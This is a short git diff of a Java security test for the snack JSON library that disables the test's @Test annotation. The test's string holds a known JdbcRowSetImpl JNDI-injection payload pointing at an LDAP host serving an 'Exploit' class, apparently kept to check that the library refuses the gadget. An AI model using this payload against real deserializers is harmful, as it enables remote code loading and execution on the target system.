@@ -8,7 +8,7 @@ import org.noear.snack.ONode;
  */
 public class JdbcRowSetImplTest {
     String json = "{@type:'com.sun.rowset.JdbcRowSetImpl',dataSourceName:'ldap://192.168.142.44:1389/fastjson/Exploit',autoCommit:true}";
-    @Test
+//    @Test
     public void test(){
         //
         //不会根据 dataSourceName、autoCommit 生成 Connection 对象，并注入构造函数
